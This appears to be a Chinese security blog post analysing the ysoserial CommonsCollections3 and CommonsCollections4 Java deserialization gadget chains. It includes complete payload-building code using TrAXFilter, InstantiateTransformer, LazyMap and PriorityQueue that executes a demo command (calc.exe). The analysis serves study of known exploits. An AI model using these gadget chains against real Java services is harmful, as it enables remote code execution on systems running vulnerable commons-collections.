# ysoserial CommonsCollections3/4 详细分析

阅读量 **226760**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-16 15:30:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)

ysoserial 工具的CC3和CC4链是CC1和CC2
链的扩展链，触发过程与前两个链大致相同，主要是命令执行部分有所变化。借着这两个链的学习，巩固下前面两个链的构造和利用思路。

## 0x01 前置知识

###  0x1 反射执行构造函数

假设有一个有参构造和无参构造方法的Person类

    
    
    public class Person {
        private String name;
        public  Person(){
    
        }
        public  Person(String name){
            this.name = name;
        }
        public static void main(String[] args) {
    
        }
    }
    

**1\. 无参构造函数**

Class.newInstance()

    
    
    Person p = new Person();
    Person p = Person.class.newInstance();
    

利用getMethod和invoke方法调用

    
    
    Class person = Person.class;
    Class personClass = person.getClass();
    Method method = personClass.getMethod("newInstance",new Class[]{});
    Person c = (Person) method.invoke(person,
        new Object[]{});
    

**2\. 有参构造函数**

Constructor.newInstance()

    
    
    Person p = new Person();
    Constructor cons = Person.class.getConstructor(String.class);
    Person p = cons.newInstance("xxx");
    

利用getMethod和invoke方法调用

    
    
    Class person = Person.class;
    Class personClass = person.getClass();
    Method method = personClass.getMethod("getConstructor",new Class[]{Class[].class});
    Constructor c = (Constructor) method.invoke(person,new Object[]{new Class[]{String.class}});
    
    Class cons = c.getClass();
    Method method1 = cons.getMethod("newInstance", new Class[]{Object[].class});
    Person p = (Person) method1.invoke(c,new Object[]{new Object[]{"xxx"}});
    
    System.out.println(p.GetName());
    

###  0x2 利用反射修改变量

反射的好处是即使是私有变量，也可以通过反射获取并修改，方法如下：

    
    
    Person p = new Person("xxx");
    Field com = p.getClass().getDeclaredField("name");
    com.setAccessible(true);
    com.set(p,"tom");
    System.out.println(p.GetName());
    

需要设这变量的访问权限，把权限改成public，调用set 方法修改其内容

## 0x02 CommonsCollections3 分析

在分析过前两个链之后，CC3就显得没那么困难了，主要引入了TrAXFilter这个类在初始化的时候调用了newTransformer方法，从而触发加载构造好的字节码，完成命令执行。一些前置知识在
<https://www.anquanke.com/post/id/230788> 文章中已经提到，打算从命令执行链和调用链构造这两个方面进行分析。

###  0x1 命令执行链分析

该链针对的版本是 `commons-collections:3.1`
，命令执行部分改造的CC2的利用方式。CC2链是利用`InvokerTransformer`
类调用的`templates`中的`newTransformer`方法。而作者构造的CC3链采用了`TrAXFilter`这个新的类，但我们也可以用之前CC2链中的命令执行方法。下面分析下这两个利用

**1\. 延续CC2命令执行**

`InvokerTransformer` 类可以调用任意对象的任意方法，这个天然的利用条件在 `commons-collections:4.4`
中被修补。所以目前还是只能在3版本运行

    
    
    final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(templatesImpl),
    new InvokerTransformer("newTransformer", new Class[0], new Object[0])
    };
    

在调用 `InvokerTransformer` 类执行 `newTransformer`
方法的时候不需要再将其伪装成其他的函数，因为它本身在反序列化之前是没有被调用过的，这点不像Queue会在对象添加的时候触发比较器类。

因为`templatesImpl` 实现了Serializable接口，因此可以通过对象的形式存在，最后将会被反序列化成二进制存储格式。

![](https://p1.ssl.qhimg.com/t01ee1e623c51e670b9.png)

![](https://p4.ssl.qhimg.com/t0110490c0396a198e3.png)

**2\. 利用TrAXFilter触发命令执行**

`InvokerTransformer` 类可以调用 `newTransformer`
方法，那么是否存在一个类可以直接调用这个方法呢？作者就在CC3链中展示这个类。

`TrAXFilter` 的构造方法中存在这样的代码，会调用参数中传递过来的对象的`newTransformer`
方法，如果我们把`templates`当做该类的构造参数，那么就能完成利用

![](https://p0.ssl.qhimg.com/t014b999172a5939be6.png)

* * *

这时还存在着一个问题，没有形成完整的命令执行链，怎样才能触发`TrAXFilter`的构造方法呢？这里有两种方式触发

**方法一**

因为是在`commons-collections:3.1`中的利用，所以可以继续时候用`InvokerTransformer` 类进行构造

    
    
    final Transformer[] transformers = new Transformer[] {    
    new ConstantTransformer(TrAXFilter.class),
    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{Templates.class}}),
    new InvokerTransformer("newInstance", new Class[] {Object[].class }, new Object[] {new Object[]{templatesImpl}),};
    

需要明确的是 getConstructor 的参数类型，要通过getMethod方法获取该方法对象

![](https://p0.ssl.qhimg.com/t010c6de3a8de6bcde8.png)

`Class<?>... parameterTypes` 为Class数组

getMethod 在调用的时候第二个参数可以是单个元素也可是数组元素，InvokerTransformer方法默认采用了第二种方式。

![](https://p1.ssl.qhimg.com/t01458259fcad66c2b4.png)

所以在构造的时候 `new Class[]{}`和`new Object[]{}`
都是必须要带的，而里面的内容才是要生产方法对象的真正参数。`Class[].class` 就是Class数组类型， `Object[].class`
是Object数组类型。

**方法二**

该方法引入了新的类，`InstantiateTransformer` 也是 同时实现`Transformer`和`Serialzable`
的类，用它的目的是`transform`函数会调用`getConstructor` 方法和执行`newInstance`函数创建实例

![](https://p4.ssl.qhimg.com/t011ef1ca30b666f5a7.png)

通过该transform方法就可实现方法一中的一大堆操作，最后可以简化为以下代码

    
    
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(
            new Class[] { Templates.class },
            new Object[] { templatesImpl }
            )
    };
    

简答描述为 `InstantiateTransformer` 在 `transform`函数调用时会通过反射执行其传递的参数class类的有参构造函数。

![](https://p2.ssl.qhimg.com/t01c087ef9b237e2b97.png)

###  0x2 反序列化链分析

整个链的分析可以参考 <https://www.anquanke.com/post/id/230788#h2-5>

完整调用链如下

    
    
    /*
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InstantiateTransformer.transform()
                                   TrAXFilter.TrAXFilter()
                                   ...
                                   exec()
    
    Requires:
        commons-collections
     */
    

采用CC1中的调用关系图，修改了命令执行部分

![](https://p4.ssl.qhimg.com/t01181aaf1ddb8ae282.png)

###  0x3 Payload构造

在第二小节已经把命令执行部分的三种方式通过代码实现了。`Payload`构造部分只需要将之前的代码调用链拼接在一起就可以了。

    
    
     public static void main(String[] args) throws Exception{
            final Object templates = createTemplatesImpl("calc.exe");
            final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                    new Class[] { Templates.class },
                    new Object[] { templates }
                )
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();
    
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
            final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
    
            final Map testMap = new HashMap();
    
            Map evilMap = (Map) Proxy.newProxyInstance(
                testMap.getClass().getClassLoader(),
                testMap.getClass().getInterfaces(),
                secondInvocationHandler
            );
            final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
            byte[] serializeData=serialize(handler);
            unserialize(serializeData);
        }
    

这个是主函数代码，完整代码在
<https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/cc3.java>

## 0x03 CommonsCollections4 分析

CC4 链的命令执行采用的CC3的技术，触发部分还是沿用CC2中的结构。因此分析到这，CC4应该是前四个链中最容易理解的了。命令执行部分参照
上节的分析，简单介绍下调用链和`Payload`编写方法。

###  0x1 调用链分析

触发点是 `PriorityQueue` 里的比较器`compare`方法，之后又调用了`transformer`方法

![](https://p2.ssl.qhimg.com/t01368df9c61a25b7e3.png)

具体调用可以参考CC2分析的那篇文章，下面是调用链

    
    
    Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
            ...
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                            TrAXFilter.TrAXFilter()
                                ...
                                    exec()
    

整个触发链没有什么难理解的，可以归结为下图调用逻辑。

![](https://p1.ssl.qhimg.com/t01e85b30f42ab156c7.png)

###  0x2 Payload 编写方法

ysoserial 中的利用方法很有艺术感，用到了两处伪装 和 属性变换  
将paramTypes和args设置为正常的字符串类型和字符串值

**1\. 伪装**

伪装比较器的第一个Transformer元素

    
    
    ConstantTransformer constant = new ConstantTransformer(String.class);
    ...
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
    

在`queue`执行`add`方法后将 `ConstantTransformer`中的`iConstant`变量改为`TrAXFilter.class`

* * *

第二个伪装在

![](https://p4.ssl.qhimg.com/t012e42685e5f3387b6.png)

这里伪装的原因也是和简单的，在CC2 那篇文章里已经说过了，这里再唠叨两句，`queue`在使用add方法添加元素的时候会触发
比较器进行比较，如果这里运用了正常的payload，那么将会在这里的触发命令执行，程序将会在反序列化之前终止。

![](https://p5.ssl.qhimg.com/t012064ad039890f5c7.png)

因此要进行一次伪装，那么为什么要添加两个元素呢，其实在之前CC2的分析中也有涉及到，因为在`queue`反序列化的时候会把每个元素读取出来，并且执行到`heapify`函数，如果此时元素数为零就不会触发该链，因此只能这么设计

![](https://p0.ssl.qhimg.com/t010067069f54792c97.png)

采用以下方法修改queue的两个元素

    
    
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
    paramTypes[0] = Templates.class;
    args[0] = templates;
    

首先运用getDeclaredField方法获取到对象的iParamTypes和iArgs属性，之后直接给这两个属性赋值，即可完成替换。

**2\. 手动构造**

看过ysoserial封装好的代码后，根据自己的理解自己手动构造功能类似的payload，这里从参考了其他师傅的构造方式，写出了两版利用代码

    
    
    public static void main(String[]  args) throws Exception {
            final Object templates = createTemplatesImpl("calc.exe");
            // mock method name until armed
            ConstantTransformer constant = new ConstantTransformer( TrAXFilter.class);
            Class[] paramTypes = new Class[] { Templates.class };
            Object[] argsv = new Object[] { templates };
            InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, argsv);
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
            // create queue with numbers and basic comparator
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
            queue.add(1);
            queue.add(1);
            TransformingComparator transCom = new TransformingComparator(chain);
            Field com = PriorityQueue.class.getDeclaredField("comparator");
            com.setAccessible(true);
            com.set(queue,transCom);
    
            byte[] serializeData=serialize(queue);
            unserialize(serializeData);
        }
    

这一版的代码很巧妙，学习了tr1ple师傅的方法，这样只需伪装一步就可以实现绕过queue的add方法的触发利用链。在添加完元素后再利用反射动态添加比较器
`comparator`，这样就避免修改元素较多的instantiate对象

* * *

ysoserial 采用的修改instantiate对象中的属性和ConstantTransformer中的属性

    
    
     public static void main(String[]  args) throws Exception {
            final Object templates = createTemplatesImpl("calc.exe");
            // mock method name until armed
            ConstantTransformer constant = new ConstantTransformer(String.class);
            Class[] paramTypes = new Class[] { String.class };
            Object[] argsv = new Object[] { "foo" };
            InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, argsv);
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
            // create queue with numbers and basic comparator
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(chain));
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
            Field com = instantiate.getClass().getDeclaredField("iParamTypes");
            com.setAccessible(true);
            com.set(instantiate,new Class[] { Templates.class });
    
            Field com1 = instantiate.getClass().getDeclaredField("iArgs");
            com1.setAccessible(true);
            com1.set(instantiate,new Object[] { templates });
            // switch method called by comparator
            setFieldValue(constant, "iConstant", TrAXFilter.class);
            byte[] serializeData=serialize(queue);
            unserialize(serializeData);
        }
    

在执行add方法后，将instantiate对象的iParamTypes和iArgs赋值构造好的变量，并把ConstantTransformer对象中的iConstant变量设置为TrAXFilter.class，以此完成最后的利用。

将完整版的代码上传至github

<https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/cc4-1.java>  
<https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/cc4-2.java>

## 0x04 总结

分析过这两个链后，感悟就又不一样了，主要有以下几个方面：

###  0x1 为什么有这两个链

CC3
只有命令部分是比较新颖的，使用的是TrAXFilter类配合插入恶意字节码的templates进行命令执行，但值得注意的是这个新的命令执行可以做到各个commons-collections版本通杀，以至于在CC4
也在使用这个触发方式。那么可以这么说CC3和CC4存在的意义就在于运用这个命令执行方式，以至于前面的触发链和CC1、CC2几乎一样。

###  0x2 命令执行方式是多样化的

在分析CC3的命令执行方式时，介绍了三种相似的利用姿势，但其核心都是利用插入恶意字节码的templates进行命令执行，从这一点来讲都是一样的，不一样的点是怎么触犯templates的newTransformer方法。这三种方式分别是

  1. 通过 InvokerTransformer 执行 newTransformer
  2. 通过invoke的方式调用 TrAXFilter.class 的getConstructor，newInstance完成有参实例的初始化
  3. 利用InstantiateTransformer 直接完成TrAXFilter的实例构建

###  0x3 反射真的很重要

在反序列化利用的过程中处处都有遇到反射，反射调用方法链，反射获取对象变量，反射动态修改对象变量。反射的概念有与Class类有着很大的关联，Class对象是保存类的基础信息的对象，在本文的命令执行方式分析中，用到了很多反射的姿势，有兴趣的小伙伴可以好好研究下。

## 0x05 参考文章

<https://www.anquanke.com/post/id/230788>  
<https://www.cnblogs.com/tr1ple/p/12404108.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/233393](/post/id/233393)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [Java](/tag/Java)
  * [双倍活动](/tag/双倍活动)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

